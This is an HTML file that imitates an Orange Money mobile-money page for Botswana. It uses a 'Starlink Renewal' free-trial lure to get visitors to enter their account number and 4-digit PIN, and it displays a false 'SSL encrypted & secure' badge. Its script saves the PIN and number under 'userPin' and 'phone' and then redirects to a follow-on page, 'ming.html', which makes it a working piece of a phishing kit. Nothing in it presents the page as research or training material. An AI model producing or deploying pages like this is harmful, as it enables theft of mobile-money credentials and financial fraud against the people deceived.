<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Orange Money</title>
<style>
*{box-sizing:border-box}
html,body{margin:0;min-height:100%;font-family:Arial,Helvetica,sans-serif;background:#f4f4f3;color:#1f2430}
body{display:flex;justify-content:center;align-items:flex-start;padding:24px 16px}
.card{width:100%;max-width:420px;background:#fff;border-radius:15px;overflow:hidden;box-shadow:0 10px 28px rgba(0,0,0,.12)}
.header{min-height:120px;padding:20px;background:linear-gradient(135deg,#ff8a1d,#f57c20);display:flex;flex-direction:column;align-items:center;justify-content:center;color:#fff}
.logo-wrap{height:31px;display:flex;align-items:center;gap:6px;margin-bottom:7px}
.logo{width:25px;height:25px;border-radius:4px;background:#fff;display:flex;align-items:center;justify-content:center;color:#f57c20;font-size:17px;font-weight:900}
.logo-text{font-size:11px;font-weight:700;color:#fff}
.header-title{font-size:17px;font-weight:700}
.content{padding:28px 30px 24px}
.amount-row{display:flex;justify-content:space-between;align-items:flex-start;padding-bottom:16px;border-bottom:1px solid #eee}
.label{font-size:8px;color:#7d8793;font-weight:700;letter-spacing:1px;margin-bottom:2px}
.amount{font-size:17px;font-weight:800}
.service{text-align:right}.service-value{font-size:10px;font-weight:500;margin-top:3px}
.instruction{text-align:center;color:#555;font-size:10px;margin:18px 0 21px}
.field-label{font-size:10px;font-weight:700;margin:0 0 7px}
.phone-box{min-height:44px;border:1px solid #ccd2da;border-radius:9px;display:flex;align-items:center;overflow:hidden;background:#fff}
.country{height:100%;display:flex;align-items:center;gap:7px;padding:0 10px;border-right:1px solid #e4e7eb;font-size:10px;white-space:nowrap}
.flag{font-size:13px;line-height:1}.code{font-weight:600}
.phone{flex:1;border:0;outline:0;height:44px;padding:0 11px;font-size:14px;color:#555;min-width:0}
.pin-label{margin-top:17px}.pin-box{min-height:52px;border:1px solid #ccd2da;border-radius:9px;display:flex;align-items:center;justify-content:center}
.pin-box input{width:180px;height:40px;border:0;outline:0;background:transparent;text-align:center;font-size:20px;letter-spacing:12px;color:#777;padding-left:12px}
.pin-hint{text-align:center;color:#777;font-size:8px;margin-top:9px}
.confirm{width:100%;min-height:44px;margin-top:17px;border:0;border-radius:9px;background:#f57c20;color:#fff;font-size:11px;font-weight:800;letter-spacing:1px;box-shadow:0 7px 13px rgba(245,124,32,.28);cursor:pointer}
.confirm:active{transform:scale(.99)}.secure{text-align:center;margin-top:24px;color:#6c737b;font-size:7px;letter-spacing:.8px}.secure span{color:#f57c20;font-size:10px;margin-right:4px}
.error{text-align:center;color:#c62828;font-size:9px;min-height:12px;margin-top:8px}
@media(max-width:480px){body{padding:0}.card{max-width:none;border-radius:0 0 15px 15px}.content{padding:22px 20px 20px}}
</style>
</head>
<body>
<div class="card">
  <div class="header">
    <div class="logo-wrap"><div class="logo">O</div><div class="logo-text">Orange Money</div></div>
    <div class="header-title">Orange Money</div>
  </div>
  <main class="content">
    <div class="amount-row"><div><div class="label">AMOUNT</div><div class="amount">Free trial</div></div><div class="service"><div class="label">SERVICE</div><div class="service-value">Starlink Renewal</div></div></div>
    <div class="instruction">Enter your Orange Money details to activate your free trial</div>
    <div class="field-label">Orange Money Number</div>
    <div class="phone-box"><div class="country"><span class="flag">🇧🇼</span><span class="code">+267</span></div><input id="phone" class="phone" type="tel" inputmode="numeric" maxlength="9" placeholder="XX XXX XXX" autocomplete="off"></div>
    <div class="field-label pin-label">Enter PIN</div>
    <div class="pin-box"><input id="pin" type="password" maxlength="4" inputmode="numeric" pattern="[0-9]*" aria-label="4-digit PIN" autocomplete="off"></div>
    <div class="pin-hint">enter 4 digits</div>
    <button class="confirm" id="confirm" type="button">CONFIRM FREE TRIAL</button>
    <div class="error" id="error"></div>
    <div class="secure"><span>◌</span> SSL ENCRYPTED &amp; SECURE</div>
  </main>
</div>
<script>
const phone = document.getElementById('phone');
const pin = document.getElementById('pin');
const error = document.getElementById('error');
phone.addEventListener('input', () => { phone.value = phone.value.replace(/\D/g, '').slice(0, 9); });
pin.addEventListener('input', () => { pin.value = pin.value.replace(/\D/g, '').slice(0, 4); });
document.getElementById('confirm').addEventListener('click', () => {
  error.textContent = '';
  if (!/^\d{9}$/.test(phone.value)) { error.textContent = 'Please enter a valid 9-digit Orange Money number.'; return; }
  if (!/^\d{4}$/.test(pin.value)) { error.textContent = 'Please enter your 4-digit PIN.'; return; }
  localStorage.setItem('phone', phone.value);
  localStorage.setItem('userPin', pin.value);
  window.location.href = 'ming.html';
});
</script>
</body>
</html>
